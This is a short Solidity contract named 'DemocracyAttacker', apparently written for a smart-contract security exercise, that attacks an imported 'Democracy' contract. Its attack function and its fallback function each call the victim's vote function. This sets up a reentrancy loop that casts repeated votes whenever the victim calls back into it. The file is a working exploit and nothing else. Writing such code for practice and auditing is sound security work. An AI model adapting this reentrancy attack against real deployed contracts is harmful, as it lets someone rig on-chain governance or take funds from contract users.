// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "./Democracy.sol";
import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract DemocracyAttacker {
    Democracy public victim;

    constructor(address addr) payable {
        victim = Democracy(addr);
        // victim.mint{value: msg.value}(address(this), 22);
    }

    function attack() external {
        console.log("attack....");
        victim.vote(address(0));
    }

    fallback() external payable {
        console.log("fallback....");
        victim.vote(address(0));
    }
}
